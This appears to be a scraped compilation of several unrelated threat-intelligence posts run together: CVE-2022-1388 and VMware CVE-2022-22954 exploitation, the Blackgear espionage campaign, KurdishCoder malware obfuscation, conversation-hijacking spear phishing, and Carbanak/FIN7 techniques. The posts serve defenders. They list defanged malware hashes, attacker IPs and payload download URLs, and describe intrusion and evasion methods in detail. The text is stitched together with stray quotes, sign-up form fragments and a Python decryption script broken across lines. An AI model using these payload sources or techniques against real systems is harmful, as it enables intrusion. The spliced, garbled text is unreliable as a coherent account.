Palo Alto Networks customers receive protections against the exploitation of this vulnerability in the following ways: Palo Alto Networks will update this Threat Brief with new information and recommendations as they become available.
"K23605346: BIG-IP iControl REST vulnerability CVE-2022-1388 EnemyBot Attempts to Exploit CVE-2022-1388 30f7e1998d162dfad69d6d8abb763ae4033bbd4a015d170b1ad3e20d39cd4e20 da647646cd36a3acb716b4266e9032f9c1caf555b7667e1dbe5bef89e7d2fdbb b39d2a1202351d3be5d9906ec47ee05c305302124dddec5538dc7b9924c6b85d ad6d44c70f83431bedf890967f2da0607c9b1f79591fb1b2697160f5b1c1a75c 1f93a6696f7bf1b2067cc503583deb4840404ebeeba89579bd303f57000baeb7 9a72aab2a3d1d6e66c185966597a52a8726ca25f5d9e2195af44f98d8b1847d5 53214f4d2d2dfd02b46f416cbdcb6f3a764820a50da4d59926f829b96cf82a6c 20.187.67[.]224 192.132.218[.]149 85.203.23[.]73 116.48.110[.]159 hxxps://transfer[.]sh/dlxo3I/1.sh hxxp://20.239.193[.]47/kele.sh hxxp://20.239.193[.]47/kele1 hxxp://20.187.86[.]47/dadda Updated May 16, 2022 Sign up to receive the latest news, cyber threat intelligence and research from us Please enter your email address!"
"Please mark, I'm not a robot!"
"By submitting this form, you agree to our Terms of Use and acknowledge our Privacy Statement."
"Blackgear (also known as Topgear and Comnie) is a cyberespionage campaign dating back to 2008, at least based on the Protux backdoor used by its operators."
"In 2016, for instance, we found their campaigns attacking Japanese organizations with various malware tools, notably the Elirks backdoor."
"Blackgear’s operators are well-organized, developing their own tools, which we observed to have been recently fine-tuned, based on their latest attacks."
"A notable characteristic of Blackgear is the degree to which its attacks are taken to evade detection, abusing blogging, microblogging, and social media services to hide its command-and-control (C&C) configuration."
"Compared to when C&C information is embedded within the malware, where it’s preset and can thus be easily blocked, this tactic lets Blackgear’s operators to quickly change C&C servers as needed."
"It can, in turn, prolong the campaign’s foothold in the system and enable attackers to carry out further lateral movement."
"Analyzing the Marade downloader (detected by Trend Micro as TSPY_MARADE.ZTBC) and the version of Protux (BKDR_PROTUX.ZTBC) employed by Blackgear’s latest campaigns, we found their encrypted configurations on blog and social media posts (see Figure 1)."
This can be an indication that these malware tools were developed by the same group.
Figure 1. Marade’s encrypted configuration on a Facebook post Figure 2. Infection chain of Blackgear’s attack Attack chain
"To paint a bigger picture of Blackgear’s attacks, we correlated the tools and tactics they used against their targets."
"Here’s a summary of Blackgear’s latest campaign: Use a decoy document or fake installer file, sent via spam email to lure a potential victim into clicking it."
The decoy document will extract the Marade downloader.
It drops itself in the machine’s Temp folder and increases its file size to over 50MB in order to bypass traditional sandbox solutions.
Marade will check if the infected host can connect to the internet and if it is installed with anti-virus (AV) software.
"If the affected system can connect online and doesn’t have AV software, Marade will connect to a Blackgear-controlled public blog or social media post to retrieve an encrypted C&C configuration."
"Otherwise, Marade will use the C&C information embedded in its code."
The encrypted strings will pose as a magnet link to keep its malicious traffic from being detected by AV software.
Marade will then decrypt the encrypted strings and retrieve the C&C server information.
The C&C server will send Protux to the victim’s host and execute it.
"Protux, a known backdoor, is executed by abusing the rundll32 dynamic-link library (DLL)."
"It tests the host’s network, retrieves the C&C server from another blog, and uses the RSA algorithm to generate the session key and send information to the C&C server. Blackgear’s malware tools are delivered to targets using RAR self-extracting executable (SFX) files or office Visual Basic Script (VBScript) to create a decoy document."
Below is a screenshot of the SFX files and document used by the latest campaigns: Figure 3.
"Contents of malicious SFX file used by Blackgear, posing as a Flash Player installer Figure 4. Malicious document used by Blackgear (top) and how VBScript is used to execute Marade (bottom)"
Figure 5.
Encrypted configurations of Protux (top) and Marade (bottom) in the same blog post Correlating Marade and Protux
The encrypted configurations of Marade and Protux can both be found on a single blog post.
"As shown in Figure 5, the strings highlighted in red function as a search tag to identify the location of the configuration information; those highlighted in orange pertain to the encrypted configuration that Protux will retrieve."
"In Blackgear’s previous campaigns, Protux’s configuration format had to be changed to another version."
"For instance, Protux’s older iteration will look for the “++a++” tag, as shown in Figure 5."
"The format used by Protux’s latest version is now similar to Marade’s, as shown in Figure 6."
Figure 6.
Protux’s encrypted configuration on a public blog (note the six magnet URLs; the third is Protux’s latest configuration format)
"Reverse analysis of Protux’s latest version also allowed us to determine how to decrypt the C&C information, which is done in the Python code shown below."
"This can also be used by researchers, system administrators, and information security professionals when decrypting Protux’s latest version."
/usr
bin
env python2
"#-*-coding:utf-8 -*- import os, sys, datetime, operator, base64 def decrypt(): if len(sys.argv) != 2: print ""Usegae : ./decrypt_protux_magnet.py <Full magnet strings>"" sys.exit(0) str = sys.argv[1] head = str.find(""magnet:?xt=urn:bhih:"")"
"tail = str.find(""&xl="") if -1 ==tail: tail = str.find(""&amp;xl="") if -1 == head or -1 == tail: print(""can't find delimiter"") sys.exit()"
"b64_data = str[len(""magnet:?xt=urn:bhih:""): tail] b64_decode = base64.b64decode(b64_data) key = ord(b64_decode[2]) data = b64_decode[4:] output_file = open(""C2_info"", ""wb"") for single_byte in data: output_file.write(chr(ord(single_byte) ^ key)) output_file.close()"
if __name__ == '__main__': decrypt (
A new remote controller tool
We were also able to source a sample of Protux’s remote controller tool.
This provides a user interface (UI) that allows attackers to send instructions to and monitor any compromised endpoint host.
This tool can also remotely control Marade in the affected system.
Figure 7.
The controller retrieving the Marade-related information (top) and collecting Protux-related information (bottom)
"Based on the controller’s behavior, we can posit that both Marade and Protux were authored by the same threat actors."
Each serves a specific role once in the system.
"Marade acts as the first stage of attack, sending the compromised system’s information to the C&C server and then awaiting commands from the controller."
This allows threat actors to monitor and check whether the affected system is of interest to them.
"If so, the attack moves to the second stage by deploying Protux."
The tool can also control the communication between the backdoor and attacker in real time.
The following is a list of Protux’s notable components and their functions: FileManage - Lists all of the system’s drives and folders.
"ProcManage - Lists all of the processes, modules, threads, and ports in the compromised host."
ServiceManage - Lists all of the services in the compromised host.
RegManage - Lists all of the registries in the compromised host.
ScreenManage - Takes a screenshot.
ShellManage - Creates a shell.
Protux:
"An old dog learning new tricks Protux is an old backdoor, with its first version developed in 2005."
It uses DLL injection to execute its routines.
"Based on this behavior, we can map out a pattern, from the downloader to the decoy documents used."
The trigger format is: %system32/rundll32.exe <PROTUX file name> <export name>.
We saw two notable changes throughout Protux’s history: its export name and how it functions:
Export name Year How C&C information is retreieved TStartUp 2005 – 2012
Directly connect to the C&C server and use DNS server to retrieve the C&C IP address.
"CRestart 2009 – 2014 Use web DNS query to retrieve the C&C IP address, e.g., ip138[.]com."
CReset 2013 – 2018
Find the encrypted configuration through keywords on blog services.
Our research into and correlation of Protux led us to several samples that have version numbers embedded in them.
The highlighted portions in Figure 8 show the backdoor’s version number and timestamp with the “with encrypt” strings.
We also found that these versions encrypt the communication to its C&C servers.
"Protux’s latest version, 3.7, uses the open-source compiler OpenCSP to generate a session key with the RSA algorithm."
Figure 8.
Different versions of Protux used by Blackgear Figure 9.
Protux with the OpenCSP encryption function Building a proactive incident response strategy Blackgear has been targeting various industries since its emergence a decade ago.
Its apparent staying power stems from the furtive ways with which its attacks can evade traditional security solutions.
"For instance, Blackgear employs two stages of infection for each of its attacks."
The potential victim may not be able to notice the intrusions as the first stage involves only profiling and reconnaissance.
"And once infection with a backdoor occurs, typical red flags may not be raised as it abuses microblogging and social media services to retrieve information needed for C&C communication."
"Indeed, Blackgear’s attacks exemplify the need for organizations to develop and implement security strategies that can proactively respond to threats."
"A robust threat hunting strategy, for instance, helps validate indicators of attack to ascertain if the intrusions, threats, or suspicious system activities are one-off attacks or part of a larger campaign."
"This further visibility equips organizations with actionable threat intelligence, context, and insights that can be used to delve deeper into an attack — which security gaps are exploited, if the attack has multiple payloads, or if the malware has already spread within the network."
"Organizations can also consider managed detection and response, which provides in-depth threat analysis and correlation — from networks to servers and endpoints — to obtain a complete picture of and further understand a targeted attack."
Managed detection and response also helps make better sense of system- and network-level activities that an organization may not have the time or resources to do.
A list of indicators of compromise (IoCs) related to Blackgear is in this appendix.
Trend Micro solutions
"The Trend Micro™ Deep Discovery™ solution provides detection, in-depth analysis, and proactive response to today’s stealthy malware and targeted attacks in real time."
"It provides a comprehensive defense tailored to protect organizations against targeted attacks and advanced threats through specialized engines, custom sandboxing, and seamless correlation across the entire attack life cycle, allowing it to detect threats delivered by Blackgear even without any engine or pattern update."
"Blackgear’s campaigns also use email as an entry point, which is why it’s important to secure the email gateway."
"The Trend Micro™ Hosted Email Security no-maintenance cloud solution delivers continuously updated protection to stop spam, malware, spear phishing, and advanced targeted attacks before they reach the network."
The Trend Micro™ Deep Discovery™ Email Inspector and InterScan™ Web Security solutions prevent malware from ever reaching end users.
"At the endpoint level, the Trend Micro™ Smart Protection Suites deliver several capabilities that minimize the impact of attacks."
"Tags Articles, News, Reports | APT & Targeted Attacks | Research"
"In November 2019, we published a blog analyzing an exploit kit we named Capesand that exploited Adobe Flash and Microsoft Internet Explorer flaws."
"During our analysis of the indicators of compromise (IoCs) in the deployed samples that were infecting the victim’s machines, we noticed some interesting characteristics: notably that these samples were making use of obfuscation tools that made them virtually undetectable."
"After some data collection we found more than 300 samples that correlate to the mentioned indicators that were recently very active our first detections occurred in August, with the campaign itself still ongoing (having occasional spikes in between)."
We saw a rising usage of tools that provide fully-undetectable obfuscation capabilities – signifying that the authors behind the samples designed their malware variants to be as stealthy as possible.
"We decided to name the potential campaign associated with these IoCs as “KurdishCoder”, based on the property name of an assembly module found in one of the samples."
We took a look at one of the samples captured from Capesand that was used to deploy the njRat malware – notably its main executable NotepadEx.
We found that were multiple layers of obfuscation using a combination of two tools: the .NET protectors ConfuserEx and Cassandra (CyaX).
Both of these tools are used in combination to provide an array of fully undetectable capabilities to the deployed njRat malware variant.
"Examining the Capesand samples The simplified diagram taken from the previous blog shows the combination of ConfuserEx and Cassandra via the second layer of obfuscation protection, which involves the DLL CyaX_Sharp Assembly (both CyaX_Sharp and CyaX are part of the Cassandra protector)."
Figure 1.
"The infection chain for Capesand that also shows the obfuscation mechanisms For this particular sample, CyaX_Sharp is obfuscated with a customized version of ConfuserEx."
The following image shows an assembly module property that was generated for this sample.
Figure 2.
The generated assembly module property
"The module’s property name is “KurdishCoderProducts”, with a value shown to be “ConfuserEx v1.0.0-custom”."
"To understand where this value is coming from, let’s take a look at the open-source ConfuserEx tool to see how the values are created."
"From there, we can establish a hypothesis as to their source."
A closer look at ConfuserEx’s functions
"While ConfuserEx is able to apply multiple transformations to the target binary, we are interested in two particular functions that we can use for correlation: Source code building."
ConfuserEx is an open-source tool with multiple versions hosted on Github.
"By examining one of the community-supported versions, we can see there is a tool to build ConfuserEx from the command line."
This build command line has a function to update the final binary versions based on the last Git-tagged version.
"However, if ConfuserEx is built outside Git, the version update tool will just generate the value “version-custom” as shown below."
Figure 3.
Code taken from a ConfuserEx version created outside GIT
"Since the string “ConfuserEx v1.0.0-custom” is present in the module property: [module: KurdishCoderProducts(""ConfuserEx v1.0.0-custom"")]”, we can surmise that the version of ConfuserEx that was used for CyaX_Sharp was indeed built outside of Git."
2. Watermarking
"When ConfuserEx performs its obfuscation routine, one of the operations creates a watermark – a unique identifier within the software--that is present in the final binary."
The watermarking technique is implemented through the module attributes of the assembly.
The following source code screenshot shows how this is implemented.
Figure 4. Code showing how the watermarking is performed via the module attributes of the assembly
"From the previous code section, we can see the default attribute added by ConfuserEx is “ConfusedBy”."
"If we test it using a sample binary, the following is generated: Figure 5. Testing a sample binary using ConfuserEx There are two important aspects to this attribute: first, it is hardcoded as a string constant and second, its value is presented in clear text in the final binary as the following image shows."
Figure 6.
The default attribute shown in clear text in the final binary We now have solid evidence that CyaX_Sharp was obfuscated using a modified version of ConfuserEx.
"Next, let’s look for the attribute indicator, starting with the CyaX assembly used in the NotepadEx attack."
Cassandra Protector: CyaX
After inspection we noticed that this version of CyaX was similarly notable due to two characteristics.
"First, the debug symbols paths were leaked -- suggesting a possible custom build which can be correlated with another modification applied to CyaX. Figure 7."
The leaked debug symbols paths
The second indicator has to do with one of the methods of CyaX which was modified -- specifically the one injecting the binary in memory.
The following image shows the modified function name.
Figure 8.
"The modified method which was renamed to Kirkuk, which is also a name of a city in Iraq What other payloads are using KurdishCoder?"
Analysis of some of the captured samples reveals the different payloads being used (as shown in the table below).
Note that this does not cover all the samples – it is possible that other payloads are being deployed as well.
Sample Payload KurdishCoderMainSample KurdishCoder_CyaX_Sharp CyaX_method_rename CustomIncreaseX phoenix_keylogger Yes Yes Kirkuk NotePadEx Njrat No Yes Kirkuk QuickTranslation Agent Tesla Yes Yes Kurd SandiwchGenerator Agent Tesla Yes Yes Kirkuk SimpleGame Remcos Yes Yes Kirkuk AnimalGames Hawkeye Rebord Keylogger Yes Yes Kurd Table 1.
"The different samples organized name, payload delivered and the fully-undetectable stages where the attribute “KurdishCoderProduction” is present"
Cassandra Crypter
"We think one of the possible sources of the customized ConfuserEx is the online service Cassandra Crypter, which offers two kinds of subscription plans: The Premium Plan and the Private Stub."
"The Premium Plan requires payment and works automatically, while the Private Stub requires the user to contact the support from the service for further personalization."
Figure 9.
Cassandra Crypter’s subscription plans
The combination of ConfuserEx and CyaX (Cassandra protector) seems to be unique and customized based on the indicators mentioned earlier.
"While we don’t have definitive evidence that the use of these tools are part of a single campaign, we think the analyzed samples are related to a specific campaign."
"Note that the KurdishCoder indicator was spotted also by the Italian Computer Emergency Response Team - Pubblica Amministrazione (CERT-PA), which they reported as a single incident."
"As with Capesand, we will be monitoring the use of the tools mentioned in this blog entry for any future developments and updates."
Trend Micro Solutions
"A proactive, multilayered approach to security is key against a wide range of threats— from the gateway, endpoints, networks, and servers."
Trend Micro™ endpoint security has vulnerability protection that shields endpoints from identified and unknown vulnerability exploits even before patches are even deployed.
Trend Micro’s endpoint solutions such as Trend Micro™ Smart Protection Suites and Worry-Free™ Business Security protect end users and businesses from these threats by detecting and blocking malicious files and all related malicious URLs.
Indicators of Compromise (IoCs) Indicator Attribution Trend Micro Pattern Detection 068d32a43191dc0164b600b85a1621be0154504fd477167422ff4a8fb3406d73 AnimalGames Backdoor.
MSIL.BLADABINDI.QBR
07be156caac1157707ffe38266dc60abadc488226b4f41d67f23eac98dd917b0
CustomIncreaseX Backdoor.MSIL.BLADABINDI.QBR b00cc9a4292fc5cc4ae5371ea1615ec6e49ebaf061dc4eccde84a6f96d95747c NotePadEx Backdoor.MSIL.BLADABINDI.QBR 6755ce7a362ffecef805e4c54e1d5e201b6c6d561b997ebbd63a8d814ce6a53f QuickTranslation Backdoor.MSIL.BLADABINDI.QBR 8ff11efc1109073fdc49be93e1d100992314fd68ecdff2ba986107602ce75089 SandwichGenerator Backdoor.MSIL.BLADABINDI.QBR 02f2369b58fbb2ba1df2c799b73842880a4874c32c1514a0d8956133be026ade SimpleGame Backdoor.Win32.REMCOS.USMANEAGDZ
Tags Mobile | APT & Targeted Attacks | Research
Spear Phishing is a specific attack technique that has become widely used in the past few years.
"In our new research blog “FreeMilk: A Highly Targeted Spear Phishing Campaign”, our Unit 42 research team has discovered an attack campaign that takes spear phishing targeting to the next level by hijacking in-progress email conversations."
"While these are not broad attacks, they represent an escalation in attacker spear phishing techniques in a way that makes it even more important than ever to have a prevention framework in place."
Standard phishing attacks are broad attacks that use general email messages to carry out the attacks.
Standard phishing attacks aren’t personalized: they use very common themes or lures in a generalized way in conjunction with a large enough pool of targets.
The idea is that by chance some percentage of the phishing emails will look legitimate enough to the recipient to be successful.
"Basically, standard phishing attacks rely on the law of averages for its success."
"As such, it’s a suitable tactic when an attacker cares less about who falls for it than how many fall for it."
A good example of a generalized phishing campaign is the Blank Slate Campaign we wrote about in March 2017.
This attack campaign was so generalized that the attackers didn’t even bother with any theme or lure: they simply sent blank messages with malicious attachments for the recipient to open.
Spear phishing is a more refined and focused version of phishing.
"Instead of using generalized themes or lures, spear phishing uses themes or lures that are in some way relevant or appropriate for the target recipient."
"For example, a spear phishing attack could use email messages about military exercises sent to military or government targets like we saw with our recent research into CMSTAR Trojan attacks."
"Because the malicious email has a context for the target, he or she is more likely to trust it and open the email message and any attachments."
Spear phishing focuses on the quality of the theme and lure where standard phishing focuses on quantity.
Spear phishing is a suitable tactic when an attacker cares about who falls for it.
"Where a phishing attack campaign may send malicious emails out to thousands or tens of thousands of targets, a spear phishing campaign my send out just one malicious email to one target."
"Sometimes, when that target is a high-value target this attack can also be referred to as ‘Whaling”. In our new research, our Unit 42 research team has found an attack that takes the refining of spear phishing one step further."
"Rather than simply using a theme or lure that is relevant to the target, the attackers behind these attacks use an email conversation that’s in progress to carry out their attack."
"You can see an image of how this works below in Figure 1. Figure 1 Conversation Hijacking to Deliver Malware How this works is that two users, Alice (A) and Bob (B) are carrying on an email conversation."
"A shown in the top figure, an attacker, Charlie (C), carries out an attack that enables him to gain complete control of Alice’s email account, most likely through some form of credential theft."
"Once Charlie has access to Alice’s email account, he then finds email conversations between Alice and Bob, his ultimate target."
"When he finds one that is still in progress, he crafts a malicious attack email that seems to be relevant to the ongoing email conversation and sends it to Bob as shown in the bottom figure."
"If Charlie was successful in crafting the attack email to seem legitimate enough, Bob will open the email and any attachments and the attack will succeed. Unlike phishing or even general spear phishing, this is a highly sophisticated, labor intensive, focused attack."
"Carrying out a successful conversation hijacking spear phishing attack requires knowing someone that the ultimate target is communicating with, compromising that person’s account, identifying an ongoing email conversation with the ultimate target, crafting an email to appear part of that ongoing email conversation and finally sending it."
Even then there’s no guarantee of success since the target may somehow recognize the attack or have sufficient prevention controls in place to prevent the attack from succeeding.
"Given all those points, this isn’t an attack that many of us need to worry about."
But those out there who are in positions that might make them a high value target do need to be concerned about this.
"Whether you’re on the board of directors for an organization, a CEO/CFO/CSO, entrusted with important military or political information, are a journalist, or an activist/dissident, this is a kind of attack that you could face."
"And like with all targeted attacks, you don’t have to be the ultimate target of the attack campaign to be a target: this is a tactic that can be used as part of a broader attack campaign."
"For example, if you are the executive assistant for a CEO, you could be the target of an attack like this (“Bob” in our scenario above) so that you in turn are used to carry out an attack (“Alice” in our scenario above) against your CEO (who then becomes “Bob” in our scenario above). Because of the nature of the attack, unless you verify each and every email you receive, it’s unlikely that you’ll necessarily be able to spot and thwart an attack."
"In this case, your best means of protection lies in prevention."
And prevention here is really focused on two things.
"First, keeping your systems and devices fully up-to-date with the latest software and security updates."
The specific attack our Unit 42 research team has seen using this technique relied on an attack against a vulnerability in Microsoft Office for which a patch is available.
"If an attacker tried to carry this attack out against a target that was patched for this vulnerability, it would fail."
"Second, using security on your systems, devices and networks that provides multiple layers of protection can help prevent attacks. Conversation hijacking spear phishing isn’t a threat everyone faces, but for those who do it represents a significant escalation in terms of sophistication and social engineering of spear phishing attacks."
It also takes spear phishing attacks to a level that makes it nearly impossible to distinguish an attack email from a legitimate email.
"And so technological prevention controls (patching, robust security) are even more for effective prevention."
"Sign up to receive the latest news, cyber threat intelligence and research from us Please enter your email address! Please mark, I'm not a robot!"
"By submitting this form, you agree to our Terms of Use and acknowledge our Privacy Statement."
Constant monitoring of threat groups is one of the ways that security researchers and law enforcement agencies are able defend systems against cybercrime.
Among these cybercriminals are financially motivated threat groups Carbanak and FIN7.
"Although both names have at times been used to refer to the same group, organizations such as MITRE identifies them as two separate entities that wield the Carbanak backdoor in their attacks."
"However, the groups use not just the Carbanak backdoor but also other types of malware such as Pillowmint, a point-of-sale malware, and Tirion, which is said to be geared to replace Carbanak."
"MITRE also identifies different main targets for each group: While Carbanak focuses on banking institutions, FIN7 targets food, hospitality, and retail establishments."
"This week, the results of this year's round of the MITRE Engenuity ATT&CK Evaluations were released, which focused on Carbanak+FIN7."
We also separately discussed how Trend Micro solutions deal with these threats.
"For more background on what happens in attacks launched by Carbanak and FIN7, we pieced together information from our studies of these groups as well as information from ATT&CK tactics and techniques (a total of 65 techniques across 11 tactics) identified by MITRE to be related to these threat groups."
What happens in Carbanak and FIN7 attacks?
"In our analysis of a related past campaign, we observed that attackers enter the system through spear phishing."
"After gaining a foothold in the system, the dynamic data exchange (DDE) feature in Windows and legitimate cloud-based services will then be abused to deliver the malware or to establish command-and-control (C&C) communication."
"After this, the Carbanak backdoor can then be used to log keystrokes and capture screenshots, steal and delete cookies, inject malicious code on sites, and monitor various traffic."
"For lateral movement, the malware abuses remote and system administration tools."
"To be more specific in terms of ATT&CK® techniques, Carbanak and FIN7 share a notable number of similarities."
"However, some techniques are only used by one of them, as we discuss in the subsequent sections."
"Figure 1. ATT&CK® tactics shared between Carbanak and FIN7 The following are the tactics and techniques that are employed by Carbanak and FIN7, as shared by MITRE."
Initial Access
Both groups use spear-phishing campaigns with attachments that are embedded with exploits as an entry point to the target system.
Execution
Successfully entering the system leads to the next step: executing the attack.
"For code and behavior execution, both groups use a variety of techniques through native API, PowerShell, service execution, user execution, Windows Component Object Model (COM) and Distributed COM, and Windows Management Instrumentation (WMI)."
Carbanak also abuses command-line interface and DDE client-server protocol.
"On the other hand, FIN7 takes advantage of Mshta, a utility that can execute VBScript, and scheduled tasks to run malicious code on user systems."
Persistence
"Once the malicious behavior is executed, the attackers will attempt to keep their presence in a system."
"To maintain persistence, the groups create new services."
They also add programs to a startup folder that can be referenced with a registry run key.
We detected a variant of the Carbanak malware that adds registry entries and keys as an autostart technique.
Credentials of existing valid accounts were also abused.
"In the case of FIN7, the use of application shimming databases (which can allow developers to apply fixes to applications without rewriting code) and hooking processes that allow the modification of program behaviors are some of the techniques that can be applied."
The former has been utilized in a campaign involving the Pillowmint malware.
Privilege Escalation
Some functions that are needed for the attack require admin privileges.
"To elevate privileges, the groups bypass Windows User Account Control (UAC) mechanisms, new services, and valid accounts to elevate process privileges."
"For the same purpose, on Linux systems, Carbanak attacks can use sudo, a program that permits users to execute the programs of a superuser."
FIN7 attacks can and inject code into processes and hijack the search order used to load DLL files.
Defense Evasion
"After a series of malicious behavior, attackers need to remain stealthy and undetected by using security solutions that can remove threats out of the system."
"For defense evasion, both groups create or acquire tools for code signing the malware, or deobfuscate or decode files or information by using malware functions or utilities in the system."
"Both groups also employ masquerading to make features appear benign to security solutions, files or information obfuscation to make these files and information difficult to discover, software packing to conceal code, and process injection to evade process-based defense."
"Carbanak also performs techniques for disabling security tools, deleting files that are left in malicious activity, and modifying registry to hide configuration information."
FIN7 utilizes guardrails to restrict execution and abused utilities that allow indirect command execution that can go past security restrictions.
The group also evades virtualization and sandboxes and injects malicious code into hollowed processes to dodge process-based defenses.
Credential Access
Some portions of the system are protected by credentials.
"To steal these, both groups employed credential dumping and input capture."
"The former involves credentials that are usually in the form of hash or clear text, while the latter involves API or web portals."
Carbanak also performs brute force tactics or takes advantage of credentials that are saved in web browsers.
"On the other hand, FIN7 performs hooking."
Discovery
"For the discovery phase, the Carbanak and FIN7 campaigns gain more knowledge about the system by gathering listings of various information: open application windows, running processes, IP addresses and other network identifiers in remote systems, detailed hardware and system information, system network configuration and settings, and system owners and users."
"Carbanak also collects information on accounts, files and directories, group permissions, and registries."
FIN7 gathers information on network shares.
The gathered information can aid in the next step: lateral movement.
Lateral Movement
"The groups move through the network and identify key assets and data by logging in via RDP, copying files to upload adversary tools through remote file copy, and abusing Window admin shares."
"In Carbanak attacks, the groups’ attacks can involve logging into services that accept remote connections and using stolen password hashes through the “pass the hash” method."
Collection
"After moving through the network and identifying assets to target, the next step would be to gather key data."
"At the collection phase, Carbanak and FIN7 campaigns harvest data from local system sources and through input and screen capture (as performed in a related campaign using the Tirion malware)."
FIN7 attacks can stage collected data in a particular location in preparation for exfiltration.
Command and Control
"In both Carbanak and FIN7 attacks, communication with users’ compromised systems is done through bypassing firewalls or network detection systems via commonly used ports, using connection proxies to avoid direct connections to the threat group’s infrastructure, employing the command-and-control channel to remotely copy files from an external system, blending in with existing network traffic by using standard application layer protocol, and taking advantage of standard cryptographic protocol to disguise command-and-control traffic."
Carbanak campaigns can also use legitimate programs and remote access software for command and control.
They also employ standard non-application layer protocols for communication.
Exfiltration
"In the final phase of the attack, the groups exfiltrate the stolen data into the normal communications channel via command-and-control channels."
"For FIN7 attack routines, data can be compressed and/or encrypted before being exfiltrated."
ATT&CK® tactics and techniques for Linux were also shared by MITRE.
Continuous vigilance against threat groups is an important aspect of keeping up with — if not being one step ahead of — threats.
"Solutions such as Trend Micro Vision One™️ provide visibility, correlated detection, and behavior monitoring across multiple layers: email, endpoints, servers, cloud workloads."
"Tags Endpoints | APT & Targeted Attacks | Research | Articles, News, Reports"
This post is also available in: 日本語 (Japanese)
"On April 6, 2022, VMware published a security advisory mentioning eight vulnerabilities, including CVE-2022-22954 and CVE-2022-22960 impacting their products VMware Workspace ONE Access, Identity Manager and vRealize Automation."
"On April 13, they updated their advisory with information that CVE-2022-22954 is being exploited in the wild."
"Multiple writeups detailing exploitation scenarios for the aforementioned two vulnerabilities were published in the last week of April, finally followed by a CISA Alert on May 18."
The CISA Alert also calls out CVE-2022-22972 and CVE-2022-22973 – published on the same day and affecting the same products – as being highly likely to be exploited.
Unit 42 has observed numerous instances of CVE-2022-22954 being exploited in the wild.
"In this blog post, we share context around this observed activity, along with how the Palo Alto Networks product suite can be leveraged to protect against it."
Timeline for VMware Vulnerabilities CVE-2022-22954 in the Wild Direct Downloads Mirai/Gafgyt Dropper Scripts or Variants Webshells Perl Shellbot Base64 Injections SSH Key Targeting CVE-2022-22960 in the Wild Conclusion Indicators of Compromise
2022-04-06:
"Publication of VMware advisory VMSA-2022-0011 regarding CVE-2022-22954, CVE-2022-22955,CVE-2022-22956, CVE-2022-22957, CVE-2022-22958, CVE-2022-22959, CVE-2022-22960, CVE-2022-22961."
2022-04
-11:
Proofs of concept available on GitHub.
This is also the earliest date at which Unit 42 observed exploitation attempts and scanning activity. 2022-04-13: VMware advisory updated with knowledge of active exploitation of CVE-2022-22954 in the wild.
2022-05-18:
"Publication of VMware advisory VMSA-2022-0014 regarding CVE-2022-22972, CVE-2022-22973."
Publication of CISA Alert.
"As of this writing, no proofs of concept for exploitation of CVE-22972 or CVE-2022-22973 are known."
This post will be updated with new findings as they are discovered.
"CVE-2022-22954, a remote code execution (RCE) vulnerability due to server-side template injection in VMware Workspace ONE Access and Identity Manager, is trivial to exploit with a single HTTP request to a vulnerable device."
The list below details the exploits Unit 42 observed targeting this vulnerability that we deemed worth highlighting.
The injected commands worth mentioning that intended to further download payloads to a vulnerable machine can be categorized into the following broad categories: We observed several instances of CVE-2022-22954 being exploited to drop variants of the Mirai malware.
"In most cases, the exploit was only used to drop the payload, however the payloads themself did not contain CVE-2022-22954 exploits for further propagation."
"Instead, they were either non-specific Mirai variants or contained previously known exploits such as CVE-2017-17215."
"The exception to this is Enemybot, a currently prevalent botnet built with bits of code from both Gafgyt and Mirai source code."
The exploits involving Enemybot eventually download Enemybot samples that themselves embed CVE-2022-22954 exploits for further exploitation and propagation.
"We observed the vulnerability exploited to download webshells, including: Certain injected commands result in the download of obfuscated Perl scripts."
Deobfuscating these scripts reveals they are versions of the known bot family “Stealth Shellbot” that reaches out to an IRC server to listen for commands to perform.
It has the ability to further make HTTP requests based on commands received.
"This would mean infected machines could then be directed to further perform scanning and exploitation activity, in addition to directly executing shell commands received from the command and control (C2) server on the target machine."
A complete list of indicators of compromise (IoCs) can be found at the end of this post.
This last command downloads a shell script that ultimately downloads and executes an XMRig coinminer.
We also observed some instances of injected payloads that were either trying to read authorized keys on vulnerable machines or were writing into the authorized_keys file to add to the machine’s list of accepted keys.
Following is an example of such an attempt.
"CVE-2022-22960 is a privilege escalation vulnerability in VMware Workspace ONE Access, Identity Manager and vRealize Automation instances, due to improper permissions in support scripts."
The vulnerability can be leveraged to run commands as a root user on a vulnerable instance.
"More specifically, this flaw exists since the default user for these VMware products, horizon, has access to several sudo commands, some of which involve paths that can be overwritten as well."
"Attackers can, therefore, leverage CVE-2022-22954 to remotely execute commands to overwrite specific paths."
"If successful, CVE-2022-22960 can then be leveraged to execute these overwritten paths with root permissions using the sudo command."
Our research so far has shown one publicly known sample demonstrating exploitation of CVE-2022-22960 by overwriting the /usr/local/horizon/scripts/publishCaCert.hzn file.
The content of this exploit file can be observed below.
Another proof of concept code sample is additionally available targeting the following 2 filepaths: /opt/vmware/certproxy/bin/certproxyService.sh /usr/local/horizon/scripts/diagnostic/getPasswordExpiry.hzn
"Palo Alto Networks is still actively investigating a number of the aforementioned vulnerabilities, many of which do not have publicly available exploit code."
"Presently, customers may leverage the following to block or detect the threats communicated throughout this publication:"
Palo Alto Networks Next Generation Firewall Threat Prevention blocks CVE-2022-22954 exploits with Signature 92483.
"Cortex Xpanse was able to identify ~800 instances of VMware Workspace ONE Access connected to the public internet, and can be leveraged to enumerate potentially vulnerable instances within customer networks."
WildFire and Cortex XDR categorize all samples of supported file types as malware.
"Additionally, all encountered URLs have been flagged as malware within PAN-DB, the Advanced URL Filtering URL database."
"If you think you may have been compromised or have an urgent matter, get in touch with the Unit 42 Incident Response team or call: As further information or detections are put into place, Palo Alto Networks will update this publication accordingly."
"Palo Alto Networks has shared these findings, including file samples and indicators of compromise, with our fellow Cyber Threat Alliance members."
CTA members use this intelligence to rapidly deploy protections to their customers and to systematically disrupt malicious cyber actors.
Learn more about the Cyber Threat Alliance.
